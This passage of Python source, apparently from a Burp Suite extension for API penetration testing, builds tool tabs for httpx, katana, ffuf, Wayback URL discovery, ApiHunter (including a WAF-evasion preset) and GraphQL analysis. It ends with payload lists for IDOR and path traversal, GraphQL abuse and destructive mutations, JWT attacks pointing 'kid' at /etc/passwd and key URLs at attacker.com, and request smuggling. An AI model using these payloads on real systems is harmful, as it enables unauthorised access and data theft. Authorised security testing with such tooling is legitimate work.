            "Adds page titles alongside status codes for faster endpoint review.",
        ),
        (
            "Tech+Server",
            "{httpx_path} -l {urls_file} -status-code -tech-detect -server -nc -silent",
            "Includes technology and server fingerprinting with status codes.",
        ),
    ]
    controls_line1.add(
        self._create_command_preset_combo(
            self.httpx_custom_cmd_field,
            self.httpx_custom_cmd_checkbox,
            httpx_presets,
            self.httpx_preset_help_label,
        )
    )
    controls_line1.add(
        self._create_preset_help_button(
            "HTTPX",
            ["{httpx_path}", "{urls_file}"],
            httpx_presets,
            usage_notes=[
                "Use local ProjectDiscovery httpx binary, not Python httpx CLI.",
                "Default mode probes status codes for URLs exported from Recon.",
                "Use presets to add title, tech-detect, and server fingerprint output.",
            ],
            override_notes=[
                "Include {urls_file} if you want to probe Recon-derived URLs.",
                "If binary check fails, set HTTPX Path to /home/teycir/go/bin/httpx.",
            ],
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Probe Endpoints", Color(0, 150, 136), lambda e: self._run_httpx(e)
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Stop", Color(255, 140, 0), lambda e: self._stop_httpx(e)
        )
    )
    self._add_force_kill_button(controls_line2, lambda: getattr(self, "httpx_area", None))
    controls_line2.add(
        self._create_action_button(
            "Export URLs", Color(70, 130, 180), lambda e: self._export_httpx_urls()
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Clear", Color(220, 53, 69), lambda e: self.httpx_area.setText("")
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Copy",
            Color(108, 117, 125),
            lambda e: self._copy_to_clipboard(self.httpx_area.getText()),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "To AI",
            Color(33, 150, 243),
            lambda e: self._export_text_output_to_ai("HTTPX", self.httpx_area.getText()),
        )
    )

    help_row = JPanel(FlowLayout(FlowLayout.LEFT))
    help_row.add(self.httpx_preset_help_label)
    top_panel.add(controls_line1)
    top_panel.add(controls_line2)
    top_panel.add(help_row)
    panel.add(top_panel, BorderLayout.NORTH)

    self.httpx_area, scroll = self._create_text_area_panel()
    panel.add(scroll, BorderLayout.CENTER)
    return panel

def _create_katana_tab(self):
    """Create Katana crawler tab"""
    panel = JPanel(BorderLayout())
    top_panel = JPanel()
    top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

    controls_line1 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line2 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line1.add(JLabel("Katana Path:"))
    import os

    katana_candidates = [
        os.path.expanduser("~/go/bin/katana"),
        os.path.expanduser("~/go/bin/katana.exe"),
        "katana.exe" if os.name == "nt" else "katana",
        "katana",
    ]
    default_katana = next(
        (p for p in katana_candidates if os.path.exists(p)),
        "katana.exe" if os.name == "nt" else "katana",
    )
    self.katana_path_field = JTextField(
        default_katana, 25
    )
    controls_line1.add(self.katana_path_field)
    self.katana_custom_cmd_checkbox = JCheckBox("Enable Custom", False)
    controls_line1.add(self.katana_custom_cmd_checkbox)
    controls_line1.add(JLabel("Command:"))
    self.katana_custom_cmd_field = JTextField("", 35)
    self.katana_custom_cmd_field.setToolTipText(
        "Example: {katana_path} -list {urls_file} -d 1 -jc -silent"
    )
    controls_line1.add(self.katana_custom_cmd_field)
    controls_line1.add(JLabel("Preset:"))
    self.katana_preset_help_label = JLabel(
        "Preset Help: Choose depth profile based on crawl coverage needs."
    )
    katana_presets = [
        (
            "Depth1 JSON",
            "{katana_path} -list {urls_file} -d 1 -jc -silent",
            "Fast shallow crawl (depth 1) with JSON-compatible output lines.",
        ),
        (
            "Depth2 JSON",
            "{katana_path} -list {urls_file} -d 2 -jc -silent",
            "Balanced crawl depth for wider endpoint discovery.",
        ),
        (
            "Depth3 URL",
            "{katana_path} -list {urls_file} -d 3 -silent",
            "Deeper crawl for maximum coverage; slower and noisier.",
        ),
    ]
    controls_line1.add(
        self._create_command_preset_combo(
            self.katana_custom_cmd_field,
            self.katana_custom_cmd_checkbox,
            katana_presets,
            self.katana_preset_help_label,
        )
    )
    controls_line1.add(
        self._create_preset_help_button(
            "Katana",
            ["{katana_path}", "{urls_file}"],
            katana_presets,
            usage_notes=[
                "Default mode crawls hosts from Recon with depth 1 and JS crawl.",
                "Use deeper presets for wider endpoint coverage with more runtime.",
                "Discovered URLs can be imported back into Recon.",
            ],
            override_notes=[
                "Include {urls_file} if you want to crawl Recon-derived hosts.",
                "If {urls_file} is not used, custom command fully defines scope.",
            ],
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Crawl Endpoints", Color(156, 39, 176), lambda e: self._run_katana(e)
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Stop", Color(255, 140, 0), lambda e: self._stop_katana(e)
        )
    )
    self._add_target_scope_controls(controls_line2)
    self._add_force_kill_button(controls_line2, lambda: getattr(self, "katana_area", None))
    controls_line2.add(
        self._create_action_button(
            "Export Discovered",
            Color(70, 130, 180),
            lambda e: self._export_katana_results(),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Send to Recon",
            Color(76, 175, 80),
            lambda e: self._import_katana_to_recon(),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Clear", Color(220, 53, 69), lambda e: self.katana_area.setText("")
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Copy",
            Color(108, 117, 125),
            lambda e: self._copy_to_clipboard(self.katana_area.getText()),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "To AI",
            Color(33, 150, 243),
            lambda e: self._export_text_output_to_ai("Katana", self.katana_area.getText()),
        )
    )

    help_row = JPanel(FlowLayout(FlowLayout.LEFT))
    help_row.add(self.katana_preset_help_label)
    top_panel.add(controls_line1)
    top_panel.add(controls_line2)
    top_panel.add(help_row)
    panel.add(top_panel, BorderLayout.NORTH)

    self.katana_area, scroll = self._create_text_area_panel()
    panel.add(scroll, BorderLayout.CENTER)
    self.katana_discovered = []
    self.katana_lock = threading.Lock()
    return panel

def _create_ffuf_tab(self):
    """Create FFUF fuzzer tab"""
    panel = JPanel(BorderLayout())
    top_panel = JPanel()
    top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

    controls_line1 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line2 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line1.add(JLabel("FFUF Path:"))
    import os

    ffuf_candidates = [
        os.path.expanduser("~/go/bin/ffuf"),
        os.path.expanduser("~/go/bin/ffuf.exe"),
        "ffuf.exe" if os.name == "nt" else "ffuf",
        "ffuf",
    ]
    default_ffuf = next(
        (p for p in ffuf_candidates if os.path.exists(p)),
        "ffuf.exe" if os.name == "nt" else "ffuf",
    )
    self.ffuf_path_field = JTextField(
        default_ffuf, 20
    )
    controls_line1.add(self.ffuf_path_field)
    controls_line1.add(JLabel("Wordlist:"))
    import os

    default_wordlist = os.path.expanduser("~/wordlists/api-endpoints.txt")
    if not os.path.exists(default_wordlist):
        default_wordlist = os.path.expanduser("~/wordlists/common.txt")
    if not os.path.exists(default_wordlist):
        default_wordlist = "/usr/share/wordlists/dirb/common.txt"
    self.ffuf_wordlist_field = JTextField(default_wordlist, 20)
    controls_line1.add(self.ffuf_wordlist_field)
    controls_line2.add(
        self._create_action_button(
            "Fuzz Directories", Color(255, 87, 34), lambda e: self._run_ffuf(e)
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Stop", Color(255, 140, 0), lambda e: self._stop_ffuf(e)
        )
    )
    self._add_target_scope_controls(controls_line2)
    self._add_force_kill_button(controls_line2, lambda: getattr(self, "ffuf_area", None))
    controls_line2.add(
        self._create_action_button(
            "Export Results",
            Color(70, 130, 180),
            lambda e: self._export_ffuf_results(),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Send to Intruder",
            Color(255, 140, 0),
            lambda e: self._send_ffuf_to_intruder(),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Clear", Color(220, 53, 69), lambda e: self.ffuf_area.setText("")
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Copy",
            Color(108, 117, 125),
            lambda e: self._copy_to_clipboard(self.ffuf_area.getText()),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "To AI",
            Color(33, 150, 243),
            lambda e: self._export_text_output_to_ai("FFUF", self.ffuf_area.getText()),
        )
    )

    top_panel.add(controls_line1)
    top_panel.add(controls_line2)
    panel.add(top_panel, BorderLayout.NORTH)

    self.ffuf_area, scroll = self._create_text_area_panel()
    panel.add(scroll, BorderLayout.CENTER)
    self.ffuf_results = []
    self.ffuf_lock = threading.Lock()
    return panel

def _create_wayback_tab(self):
    """Create Wayback Machine discovery tab"""
    import os

    panel = JPanel(BorderLayout())
    top_panel = JPanel()
    top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))
    stdin_prefix = "type" if os.name == "nt" else "cat"
    controls_line1 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line2 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line1.add(JLabel("Wayback:"))
    controls_line2.add(
        self._create_action_button(
            "Discover", Color(138, 43, 226), lambda e: self._run_wayback()
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Stop", Color(255, 140, 0), lambda e: self._stop_wayback(e)
        )
    )
    self._add_force_kill_button(controls_line2, lambda: getattr(self, "wayback_area", None))
    controls_line2.add(
        self._create_action_button(
            "Send to Recon",
            Color(76, 175, 80),
            lambda e: self._import_wayback_to_recon(),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Export Results",
            Color(70, 130, 180),
            lambda e: self._export_wayback_results(),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Copy",
            Color(108, 117, 125),
            lambda e: self._copy_to_clipboard(self.wayback_area.getText()),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "To AI",
            Color(33, 150, 243),
            lambda e: self._export_text_output_to_ai("Wayback", self.wayback_area.getText()),
        )
    )
    controls_line1.add(JLabel(" | From:"))
    self.wayback_from_field = JTextField("2020", 4)
    controls_line1.add(self.wayback_from_field)
    controls_line1.add(JLabel("To:"))
    self.wayback_to_field = JTextField(str(time.localtime().tm_year), 4)
    controls_line1.add(self.wayback_to_field)
    controls_line1.add(JLabel(" | Limit:"))
    self.wayback_limit_field = JTextField("50", 3)
    controls_line1.add(self.wayback_limit_field)
    self.wayback_custom_cmd_checkbox = JCheckBox("Enable Custom", False)
    controls_line1.add(self.wayback_custom_cmd_checkbox)
    controls_line1.add(JLabel("Command:"))
    self.wayback_custom_cmd_field = JTextField("", 45)
    self.wayback_custom_cmd_field.setToolTipText(
        "Example: {} \"{{targets_file}}\" | waybackurls".format(stdin_prefix)
    )
    controls_line1.add(self.wayback_custom_cmd_field)
    controls_line1.add(JLabel("Preset:"))
    self.wayback_preset_help_label = JLabel(
        "Preset Help: Choose passive historical URL source command."
    )
    wayback_presets = [
        (
            "waybackurls",
            "{} \"{{targets_file}}\" | waybackurls".format(stdin_prefix),
            "Uses waybackurls to pull archived URLs from Wayback index.",
        ),
        (
            "gau",
            "{} \"{{targets_file}}\" | gau --subs".format(stdin_prefix),
            "Uses gau to gather historical URLs including subdomains.",
        ),
        (
            "gau+threads",
            "{} \"{{targets_file}}\" | gau --subs --threads 5".format(stdin_prefix),
            "Same as gau preset with thread tuning for faster collection.",
        ),
    ]
    controls_line1.add(
        self._create_command_preset_combo(
            self.wayback_custom_cmd_field,
            self.wayback_custom_cmd_checkbox,
            wayback_presets,
            self.wayback_preset_help_label,
        )
    )
    controls_line1.add(
        self._create_preset_help_button(
            "Wayback",
            ["{targets_file}", "{from_year}", "{to_year}", "{limit}"],
            wayback_presets,
            usage_notes=[
                "Default mode queries Wayback CDX API for hosts and API base paths.",
                "From/To/Limit fields control built-in query range and depth.",
                "Preset commands use passive sources: waybackurls or gau.",
            ],
            override_notes=[
                "Include {targets_file} if you want to use generated host/path list.",
                "Custom output lines can be plain URLs or 'original | archive | timestamp'.",
                "If custom command does not use {targets_file}, scope is fully custom.",
            ],
        )
    )
    self._add_target_scope_controls(controls_line2)
    controls_line2.add(
        self._create_action_button(
            "Clear", Color(220, 53, 69), lambda e: self.wayback_area.setText("")
        )
    )
    help_row = JPanel(FlowLayout(FlowLayout.LEFT))
    help_row.add(self.wayback_preset_help_label)
    top_panel.add(controls_line1)
    top_panel.add(controls_line2)
    top_panel.add(help_row)
    panel.add(top_panel, BorderLayout.NORTH)
    self.wayback_area, scroll = self._create_text_area_panel()
    panel.add(scroll, BorderLayout.CENTER)
    self.wayback_discovered = []
    self.wayback_lock = threading.Lock()
    return panel

def _create_apihunter_tab(self):
    """Create ApiHunter tab aligned to Desktop Quick/Balanced/Deep presets."""
    panel = JPanel(BorderLayout())
    top_panel = JPanel()
    top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

    controls_line1 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line_cmd = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line2 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line1.add(JLabel("ApiHunter Path:"))
    default_apihunter = ""
    if hasattr(self, "_resolve_executable_from_path"):
        try:
            default_apihunter = self._resolve_executable_from_path("apihunter", "")
        except Exception as e:
            self._callbacks.printError(
                "ApiHunter default PATH resolve error: {}".format(str(e))
            )
    self.apihunter_path_field = JTextField(default_apihunter, 30)
    controls_line1.add(self.apihunter_path_field)
    controls_line1.add(JLabel("Calibration:"))
    self.apihunter_calibration_combo = JComboBox(
        [
            "Quick (Desktop Preset)",
            "Balanced (Desktop Preset)",
            "Deep (Desktop Preset)",
        ]
    )
    self.apihunter_calibration_combo.setSelectedItem("Balanced (Desktop Preset)")
    controls_line1.add(self.apihunter_calibration_combo)
    controls_line1.add(JLabel("Top Findings Min:"))
    self.apihunter_top_findings_min_combo = JComboBox(["Critical", "High", "Medium"])
    self.apihunter_top_findings_min_combo.setSelectedItem("Medium")
    self.apihunter_top_findings_min_combo.setToolTipText(
        "Controls the minimum severity shown in Top Findings (summary counts still include all severities)."
    )
    controls_line1.add(self.apihunter_top_findings_min_combo)
    self.apihunter_custom_cmd_checkbox = JCheckBox("Enable Custom", False)
    controls_line_cmd.add(self.apihunter_custom_cmd_checkbox)
    controls_line_cmd.add(JLabel("Command:"))
    self.apihunter_custom_cmd_field = JTextField("", 32)
    self.apihunter_custom_cmd_field.setToolTipText(
        "Example: {apihunter_path} --urls {targets_file} --format ndjson --output {results_file}"
    )
    controls_line_cmd.add(self.apihunter_custom_cmd_field)
    controls_line_cmd.add(JLabel("Preset:"))
    self.apihunter_preset_help_label = JLabel(
        "Preset Help: Desktop-equivalent Quick/Balanced/Deep command templates."
    )
    apihunter_presets = [
        (
            "Quick (Desktop Preset)",
            "{apihunter_path} --urls {targets_file} --format ndjson --output {results_file} --no-discovery --filter-timeout 3 --max-endpoints 40 --concurrency 4 --timeout-secs 12 --retries 1 --delay-ms 0 --no-mass-assignment --no-oauth-oidc --no-rate-limit --no-cve-templates --no-websocket",
            "Desktop quick preset: low-impact, dry-run style coverage with active-heavy scanners trimmed.",
        ),
        (
            "Balanced (Desktop Preset)",
            "{apihunter_path} --urls {targets_file} --format ndjson --output {results_file} --active-checks --dry-run --response-diff-deep --filter-timeout 3 --max-endpoints 80 --concurrency 5 --timeout-secs 15 --retries 1 --delay-ms 50 --per-host-clients",
            "Desktop balanced preset: active checks in dry-run mode with moderate throughput controls.",
        ),
        (
            "Deep (Desktop Preset)",
            "{apihunter_path} --urls {targets_file} --format ndjson --output {results_file} --active-checks --response-diff-deep --filter-timeout 4 --max-endpoints 0 --concurrency 6 --timeout-secs 20 --retries 2 --delay-ms 100 --waf-evasion --per-host-clients --adaptive-concurrency",
            "Desktop deep preset: full active mode with WAF-evasion posture and adaptive concurrency.",
        ),
    ]
    self.apihunter_custom_cmd_field.setText(apihunter_presets[0][1])
    self.apihunter_preset_help_label.setText(
        "Preset Help: {} Check 'Enable Custom' to run it.".format(
            apihunter_presets[0][2]
        )
    )
    self.apihunter_preset_combo = self._create_command_preset_combo(
        self.apihunter_custom_cmd_field,
        self.apihunter_custom_cmd_checkbox,
        apihunter_presets,
        self.apihunter_preset_help_label,
    )
    controls_line_cmd.add(self.apihunter_preset_combo)
    controls_line_cmd.add(
        self._create_preset_help_button(
            "ApiHunter",
            ["{apihunter_path}", "{targets_file}", "{results_file}"],
            apihunter_presets,
            usage_notes=[
                "These presets mirror ApiHunter Desktop defaults (Quick, Balanced, Deep).",
                "Targets are fed as base URLs so ApiHunter native discovery/check flow owns coverage strategy.",
                "Custom mode stays opt-in; preset fills command text without forcing custom execution.",
            ],
            override_notes=[
                "Include {targets_file} to keep Burp Recon scope.",
                "Include {results_file} and ndjson format so this tab can parse findings.",
                "Presets mirror desktop behavior; add extra CLI flags only if your engagement requires it.",
            ],
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Run ApiHunter", Color(0, 121, 107), lambda e: self._run_apihunter(e)
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Stop", Color(255, 140, 0), lambda e: self._stop_apihunter(e)
        )
    )
    self._add_target_scope_controls(controls_line2)
    self._add_force_kill_button(
        controls_line2, lambda: getattr(self, "apihunter_area", None)
    )
    controls_line2.add(
        self._create_action_button(
            "Export Targets",
            Color(70, 130, 180),
            lambda e: self._export_apihunter_targets(),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Clear", Color(220, 53, 69), lambda e: self.apihunter_area.setText("")
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Copy",
            Color(108, 117, 125),
            lambda e: self._copy_to_clipboard(self.apihunter_area.getText()),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "To AI",
            Color(33, 150, 243),
            lambda e: self._export_text_output_to_ai(
                "ApiHunter", self.apihunter_area.getText()
            ),
        )
    )
    help_row = JPanel(FlowLayout(FlowLayout.LEFT))
    help_row.add(self.apihunter_preset_help_label)
    top_panel.add(controls_line1)
    top_panel.add(controls_line_cmd)
    top_panel.add(controls_line2)
    top_panel.add(help_row)
    panel.add(top_panel, BorderLayout.NORTH)

    self.apihunter_area, scroll = self._create_text_area_panel()
    panel.add(scroll, BorderLayout.CENTER)
    self.apihunter_findings = []
    self.apihunter_lock = threading.Lock()
    return panel

def _create_graphql_tab(self):
    """Create GraphQL analysis tab orchestrating external tool checks."""
    panel = JPanel(BorderLayout())
    top_panel = JPanel()
    top_panel.setLayout(BoxLayout(top_panel, BoxLayout.Y_AXIS))

    controls_line1 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line2 = JPanel(FlowLayout(FlowLayout.LEFT))
    controls_line1.add(JLabel("Targets (comma/newline, optional):"))
    self.graphql_targets_field = JTextField("", 45)
    self.graphql_targets_field.setToolTipText(
        "Optional. Leave empty to auto-pick GraphQL endpoints from Recon history."
    )
    controls_line1.add(self.graphql_targets_field)
    controls_line1.add(JLabel("Schema File:"))
    self.graphql_schema_file_field = JTextField("", 24)
    self.graphql_schema_file_field.setToolTipText(
        "Optional local introspection JSON file for InQL-like schema analysis."
    )
    controls_line1.add(self.graphql_schema_file_field)
    controls_line1.add(JLabel("Max:"))
    self.graphql_max_targets_field = JTextField("12", 3)
    controls_line1.add(self.graphql_max_targets_field)
    controls_line2.add(
        self._create_action_button(
            "Browse",
            Color(96, 125, 139),
            lambda e: self._browse_graphql_schema_file(e),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Show Targets",
            Color(70, 130, 180),
            lambda e: self._show_graphql_targets_popup(e),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Run Analysis",
            Color(138, 43, 226),
            lambda e: self._run_graphql_analysis(e),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Generate Raider",
            Color(111, 66, 193),
            lambda e: self._generate_graphql_raider_operations(e),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Analyze Schema",
            Color(111, 66, 193),
            lambda e: self._analyze_graphql_schema_file(e),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Batch Queries",
            Color(0, 150, 136),
            lambda e: self._export_graphql_batch_queries(),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Stop", Color(255, 140, 0), lambda e: self._stop_graphql(e)
        )
    )
    self._add_force_kill_button(controls_line2, lambda: getattr(self, "graphql_area", None))
    controls_line2.add(
        self._create_action_button(
            "Send to Recon",
            Color(76, 175, 80),
            lambda e: self._send_graphql_to_recon(),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "To Repeater",
            Color(32, 201, 151),
            lambda e: self._send_graphql_operations_to_repeater(),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "To Intruder",
            Color(255, 140, 0),
            lambda e: self._send_graphql_operations_to_intruder(),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Export Results",
            Color(70, 130, 180),
            lambda e: self._export_graphql_results(),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Clear", Color(220, 53, 69), lambda e: self.graphql_area.setText("")
        )
    )
    controls_line2.add(
        self._create_action_button(
            "Copy",
            Color(108, 117, 125),
            lambda e: self._copy_to_clipboard(self.graphql_area.getText()),
        )
    )
    controls_line2.add(
        self._create_action_button(
            "To AI",
            Color(33, 150, 243),
            lambda e: self._export_text_output_to_ai(
                "GraphQL Analysis", self.graphql_area.getText()
            ),
        )
    )

    raider_row = JPanel(FlowLayout(FlowLayout.LEFT))
    raider_row.add(JLabel("Raider:"))
    self.graphql_raider_introspection_checkbox = JCheckBox("Introspection", True)
    raider_row.add(self.graphql_raider_introspection_checkbox)
    self.graphql_raider_batching_checkbox = JCheckBox("Batching", True)
    raider_row.add(self.graphql_raider_batching_checkbox)
    self.graphql_raider_alias_checkbox = JCheckBox("Aliases", True)
    raider_row.add(self.graphql_raider_alias_checkbox)
    self.graphql_raider_depth_checkbox = JCheckBox("Depth", False)
    raider_row.add(self.graphql_raider_depth_checkbox)
    self.graphql_raider_mutation_checkbox = JCheckBox("Mutations", False)
    raider_row.add(self.graphql_raider_mutation_checkbox)
    self.graphql_raider_suggestion_checkbox = JCheckBox("Field Guess", True)
    raider_row.add(self.graphql_raider_suggestion_checkbox)
    self.graphql_raider_directive_checkbox = JCheckBox("Directives", False)
    raider_row.add(self.graphql_raider_directive_checkbox)
    self.graphql_raider_fragment_checkbox = JCheckBox("Fragments", False)
    raider_row.add(self.graphql_raider_fragment_checkbox)
    self.graphql_raider_include_schema_ops_checkbox = JCheckBox("Include Schema Ops", True)
    raider_row.add(self.graphql_raider_include_schema_ops_checkbox)
    raider_row.add(JLabel("Profile:"))
    self.graphql_profile_combo = JComboBox(
        ["Balanced", "Safe Recon", "Aggressive Raider"]
    )
    self.graphql_profile_combo.setSelectedItem("Balanced")
    raider_row.add(self.graphql_profile_combo)
    raider_row.add(
        self._create_action_button(
            "Apply Profile",
            Color(96, 125, 139),
            lambda e: self._apply_graphql_profile(e),
        )
    )
    raider_row.add(JLabel("Mode:"))
    self.graphql_request_mode_combo = JComboBox(["POST JSON", "GET Query"])
    self.graphql_request_mode_combo.setSelectedItem("POST JSON")
    raider_row.add(self.graphql_request_mode_combo)
    raider_row.add(JLabel("Max Ops:"))
    self.graphql_raider_max_ops_field = JTextField("40", 3)
    raider_row.add(self.graphql_raider_max_ops_field)
    raider_row.add(JLabel("Headers:"))
    self.graphql_headers_field = JTextField("", 28)
    self.graphql_headers_field.setToolTipText(
        "Optional custom headers. Use ';' or newline, e.g. Authorization: Bearer <token>; X-API-Key: value"
    )
    raider_row.add(self.graphql_headers_field)
    self.graphql_profile_combo.addActionListener(
        lambda e: self._apply_graphql_profile(e, log_output=False)
    )

    info_row = JPanel(FlowLayout(FlowLayout.LEFT))
    info_row.add(
        JLabel(
            "Runs: Subfinder, HTTPX, Katana, FFUF, Wayback, Nuclei, Dalfox, SQLMap (if available)."
        )
    )
    top_panel.add(controls_line1)
    top_panel.add(controls_line2)
    top_panel.add(raider_row)
    top_panel.add(info_row)
    panel.add(top_panel, BorderLayout.NORTH)

    self.graphql_area, scroll = self._create_text_area_panel()
    panel.add(scroll, BorderLayout.CENTER)
    self.graphql_results = []
    self.graphql_recon_candidates = []
    self.graphql_generated_operations = []
    self.graphql_target_candidates = []
    self.graphql_selected_targets = []
    self.graphql_lock = threading.Lock()
    self.graphql_active_profile = "Balanced"
    self._apply_graphql_profile(profile_name="Balanced", log_output=False)
    self._autopopulate_graphql_targets_from_history(
        overwrite=False, append_output=False
    )
    return panel

def _get_idor_payloads(self, param_type="numeric"):
    if param_type == "uuid":
        return [
            "00000000-0000-0000-0000-000000000000",
            "ffffffff-ffff-ffff-ffff-ffffffffffff",
            "11111111-1111-1111-1111-111111111111",
            "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
            "deadbeef-dead-beef-dead-beefdeadbeef",
            "12345678-1234-5678-1234-567812345678",
        ]
    if param_type == "objectid":
        return [
            "000000000000000000000000",
            "111111111111111111111111",
            "507f1f77bcf86cd799439011",
            "aaaaaaaaaaaaaaaaaaaaaaaa",
            "ffffffffffffffffffffffff",
        ]
    return [
        "1","2","3","10","100","1000","9999","99999","0","-1","-999",
        "2147483647","-2147483648","4294967295","9223372036854775807",
        "admin","root","test","user","guest","administrator","system",
        "me","self","current","../","..%2f","..%252f","....//","..;/",
        "%2e%2e%2f","..\\..\\\\","null","undefined","NaN","Infinity",
        "*","%","$","_","true","false","yes","no","[]","{}","''",
        '""',"()","1.0","1e10","0x1","0o1","1;--","1'--","1/*",
    ]

def _get_bola_techniques(self):
    return {
        "horizontal": [
            "Swap user IDs",
            "Enumerate sequential IDs",
            "Guess common usernames",
        ],
        "vertical": [
            "Escalate to admin ID",
            "Access system resources",
            "Modify role parameters",
        ],
        "wildcard": [
            "Use * or % wildcards",
            "Empty/null ID",
            "Array injection [1,2,3]",
        ],
        "guid_attack": [
            "Brute force GUIDs",
            "Predict v1 UUIDs (timestamp-based)",
            "Try common test GUIDs",
        ],
        "path_manipulation": [
            "../admin/resource",
            "../../other_user",
            "Absolute paths /api/admin/1",
        ],
        "parameter_pollution": [
            "id=1&id=2",
            "user_id=victim&user_id=attacker",
            "Duplicate params",
        ],
        "method_override": [
            "X-HTTP-Method-Override: PUT",
            "Change GET to POST",
            "OPTIONS to bypass",
        ],
        "encoding": ["URL encode IDs", "Double encode", "Unicode normalization"],
        "type_confusion": ["String to int", "Array to object", "JSON to XML"],
        "batch_requests": [
            "GraphQL batching",
            "JSON array of IDs",
            "Bulk operations",
        ],
    }

def _get_race_condition_payloads(self):
    return {
        "techniques": [
            "Parallel requests",
            "Turbo Intruder",
            "Single-packet attack",
        ],
        "targets": [
            "Coupon redemption",
            "Balance deduction",
            "Inventory check",
            "Rate limits",
        ],
        "timing": [
            "Send 20+ simultaneous requests",
            "Use connection warming",
            "HTTP/2 single-packet",
        ],
    }

def _get_graphql_attacks(self):
    return {
        "introspection": [
            "query{__schema{types{name,fields{name}}}}",
            "query{__schema{queryType{name,fields{name,args{name,type{name}}}}}}",
            "query{__schema{mutationType{name,fields{name}}}}",
            "query{__type(name:\"Query\"){fields{name}}}",
            "{__schema{types{name,fields{name,type{name,kind,ofType{name,kind}}}}}}",
        ],
        "batching": [
            "[{query:user(id:1)},{query:user(id:2)}]",
            "[{\"query\":\"query{user(id:1)}\"},{\"query\":\"query{user(id:2)}\"}]",
        ],
        "depth": [
            "query{user{posts{comments{replies{replies{replies}}}}}}",
            "query{user{friends{friends{friends{friends{friends{friends}}}}}}}",
            "query{a{b{c{d{e{f{g{h{i{j{k{l{m{n{o{p{q{r{s{t{u{v{w{x{y{z}}}}}}}}}}}}}}}}}}}}}}}}}}",
        ],
        "aliases": [
            "query{u1:user(id:1) u2:user(id:2) u3:user(id:3)}",
            "query{a1:__typename a2:__typename a3:__typename a4:__typename a5:__typename a6:__typename}",
            "query{q1:users q2:users q3:users q4:users q5:users q6:users q7:users q8:users q9:users q10:users}",
        ],
        "mutations": [
            "mutation{deleteUser(id:1)}",
            "mutation{updateRole(id:1,role:admin)}",
            "mutation{createUser(username:\"admin\",role:\"admin\")}",
            "mutation{updateUser(id:1,email:\"attacker@evil.com\")}",
        ],
        "field_suggestion": [
            "query{__schema{directive}}",
            "query{usre{id,name}}",
            "query{admn{id,role}}",
            "query{passwrd}",
        ],
        "directive_overload": [
            "query{__typename @a@a@a@a@a@a@a@a@a@a}",
            "query{user(id:1)@skip(if:true)@skip(if:true)@skip(if:true)}",
            "query{users @include(if:true)@include(if:true)@include(if:true)}",
        ],
        "circular_fragment": [
            "query{...A} fragment A on User{friends{...A}}}",
            "query{...F1} fragment F1 on Query{...F2} fragment F2 on Query{...F1}",
        ],
        "array_batching": [
            "[{\"query\":\"query{__typename}\"},{\"query\":\"query{__typename}\"},{\"query\":\"query{__typename}\"}]",
        ],
    }

def _get_jwt_attacks(self):
    return {
        "alg_confusion": [
            "alg:none",
            "alg:HS256 with RSA key",
            "alg:None",
            "alg:nOnE",
        ],
        "kid_injection": [
            "kid:/etc/passwd",
            "kid:../../key",
            "kid:http://attacker.com/key",
        ],
        "jku_jti": ["jku:http://attacker.com/jwks.json", "jti:null"],
        "claims": ["exp:9999999999", "iat:-1", "nbf:0", "sub:admin", "role:admin"],
        "signature": [
            "Empty signature",
            "Null byte in signature",
            "Strip signature",
        ],
    }

def _get_api_abuse_vectors(self):
    return {
        "rate_limit_bypass": [
            "X-Forwarded-For rotation",
            "User-Agent rotation",
            "Multiple API keys",
        ],
        "cache_poisoning": ["X-Forwarded-Host", "X-Original-URL", "X-Rewrite-URL"],
        "smuggling": [
            "Content-Length vs Transfer-Encoding",
            "CL.TE",
            "TE.CL",
            "TE.TE",
        ],
        "desync": ["HTTP/2 downgrade", "Connection reuse", "Pipeline abuse"],
        "prototype_pollution": [
            "__proto__",
            "constructor.prototype",
            "Object.prototype",
        ],
    }

def _get_business_logic_tests(self):
    return {
